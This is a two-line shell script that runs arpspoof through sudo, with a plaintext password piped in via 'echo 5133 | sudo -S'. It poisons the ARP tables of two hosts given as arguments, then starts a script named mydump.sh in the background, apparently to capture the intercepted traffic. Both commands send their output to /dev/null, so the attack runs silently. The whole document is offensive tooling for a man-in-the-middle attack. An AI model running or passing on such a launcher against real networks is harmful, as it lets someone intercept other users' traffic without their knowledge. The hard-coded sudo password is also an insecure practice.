echo 5133 | sudo -S arpspoof $1 $2 > /dev/null 2>&1  &
./mydump.sh > /dev/null 2>&1 &
